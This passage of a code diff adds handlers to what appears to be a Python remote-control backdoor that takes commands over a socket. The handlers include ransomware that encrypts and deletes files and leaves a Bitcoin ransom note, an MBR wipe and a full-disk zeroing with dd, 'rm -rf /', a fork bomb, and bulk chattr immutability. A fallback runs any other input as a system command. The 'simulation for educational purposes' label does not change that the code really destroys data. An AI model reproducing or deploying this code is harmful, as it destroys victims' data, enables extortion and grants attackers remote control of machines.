+                                                        try:
+                                                            file_path = os.path.join(root, file)
+                                                            
+                                                            with open(file_path, 'rb') as f:
+                                                                data = f.read()
+                                                            
+                                                            if len(data) < 100 * 1024 * 1024:  # Skip files > 100MB
+                                                                encrypted_data = fernet.encrypt(data)
+                                                                
+                                                                with open(file_path + '.encrypted', 'wb') as f:
+                                                                    f.write(encrypted_data)
+                                                                
+                                                                os.remove(file_path)
+                                                                encrypted_count += 1
+                                                        except:
+                                                            pass
+                                    
+                                    # Create ransom note
+                                    ransom_note = f"""
+YOUR FILES HAVE BEEN ENCRYPTED!
+
+To recover your files, send 0.1 BTC to: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
+
+Decryption Key: {base64.b64encode(key).decode()}
+
+You have 24 hours to pay before files are permanently deleted.
+
+This is a simulation for educational purposes only.
+"""
+                                    
+                                    desktop = os.path.expanduser('~/Desktop') if IS_WINDOWS else os.path.expanduser('~/Desktop')
+                                    with open(os.path.join(desktop, 'READ_ME.txt'), 'w') as f:
+                                        f.write(ransom_note)
+                                    
+                                    s.send(f"[+] Ransomware simulation complete\n[+] Encrypted {encrypted_count} files\n[+] Key: {base64.b64encode(key).decode()}\n\n".encode())
+                                except ImportError:
+                                    s.send("[!] Cryptography library not available\n\n".encode())
+                                except:
+                                    s.send("[!] Ransomware simulation failed\n\n".encode())
+                            
+                            elif command.lower() == 'wipe_mbr':
+                                if IS_WINDOWS:
+                                    s.send("[!] DANGER: About to wipe MBR\n[!] Type 'CONFIRM' to proceed: \n".encode())
+                                    confirmation = s.recv(1024).decode().strip()
+                                    if confirmation == 'CONFIRM':
+                                        subprocess.run(['dd', 'if=/dev/zero', 'of=\\\\.\\PhysicalDrive0', 'bs=512', 'count=1'], capture_output=True, timeout=10)
+                                        s.send("[!] MBR wipe initiated...\n\n".encode())
+                                    else:
+                                        s.send("[!] MBR wipe cancelled\n\n".encode())
+                                else:
+                                    s.send("[!] DANGER: About to wipe MBR\n[!] Type 'CONFIRM' to proceed: \n".encode())
+                                    confirmation = s.recv(1024).decode().strip()
+                                    if confirmation == 'CONFIRM':
+                                        subprocess.run(['dd', 'if=/dev/zero', 'of=/dev/sda', 'bs=512', 'count=1'], capture_output=True, timeout=10)
+                                        s.send("[!] MBR wipe initiated...\n\n".encode())
+                                    else:
+                                        s.send("[!] MBR wipe cancelled\n\n".encode())
+                            
+                            elif command.lower() == 'rm_rf':
+                                if not IS_WINDOWS:
+                                    s.send("[!] DANGER: About to execute rm -rf /\n[!] Type 'CONFIRM' to proceed: \n".encode())
+                                    confirmation = s.recv(1024).decode().strip()
+                                    if confirmation == 'CONFIRM':
+                                        subprocess.run(['rm', '-rf', '/'], capture_output=True, timeout=5)
+                                        s.send("[!] Filesystem deletion initiated...\n\n".encode())
+                                    else:
+                                        s.send("[!] rm -rf cancelled\n\n".encode())
+                                else:
+                                    s.send("[!] rm_rf is Linux-only\n\n".encode())
+                            
+                            elif command.lower() == 'fork_bomb':
+                                if not IS_WINDOWS:
+                                    # Fork bomb
+                                    bomb_code = """
+import os
+while True:
+    os.fork()
+"""
+                                    
+                                    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
+                                        f.write(bomb_code)
+                                        bomb_file = f.name
+                                    
+                                    subprocess.run(['python', bomb_file], capture_output=True, timeout=2)
+                                    os.remove(bomb_file)
+                                    
+                                    s.send("[!] Fork bomb deployed...\n\n".encode())
+                                else:
+                                    s.send("[!] fork_bomb is Linux-only\n\n".encode())
+                            
+                            elif command.lower() == 'dd_zero':
+                                if not IS_WINDOWS:
+                                    s.send("[!] DANGER: About to zero hard drive\n[!] Type 'CONFIRM' to proceed: \n".encode())
+                                    confirmation = s.recv(1024).decode().strip()
+                                    if confirmation == 'CONFIRM':
+                                        subprocess.run(['dd', 'if=/dev/zero', 'of=/dev/sda'], capture_output=True, timeout=60)
+                                        s.send("[!] Hard drive zeroing initiated...\n\n".encode())
+                                    else:
+                                        s.send("[!] Hard drive zeroing cancelled\n\n".encode())
+                                else:
+                                    s.send("[!] dd_zero is Linux-only\n\n".encode())
+                            
+                            elif command.lower() == 'chattr_imm':
+                                if not IS_WINDOWS:
+                                    # Make files immutable
+                                    try:
+                                        current_dir = os.getcwd()
+                                        immutable_count = 0
+                                        
+                                        for root, dirs, files in os.walk(current_dir):
+                                            for file in files:
+                                                try:
+                                                    file_path = os.path.join(root, file)
+                                                    subprocess.run(['chattr', '+i', file_path], capture_output=True, timeout=5)
+                                                    immutable_count += 1
+                                                except:
+                                                    pass
+                                            
+                                            if immutable_count > 10:  # Limit to prevent complete lockout
+                                                break
+                                        
+                                        s.send(f"[+] Made {immutable_count} files immutable\n\n".encode())
+                                    except:
+                                        s.send("[!] Need root access for chattr\n\n".encode())
+                                else:
+                                    s.send("[!] chattr_imm is Linux-only\n\n".encode())
+                        except:
+                            s.send("[!] Dangerous command failed\n\n".encode())
                         continue
                     
                     # ===== DEFAULT: EXECUTE AS SYSTEM COMMAND =====
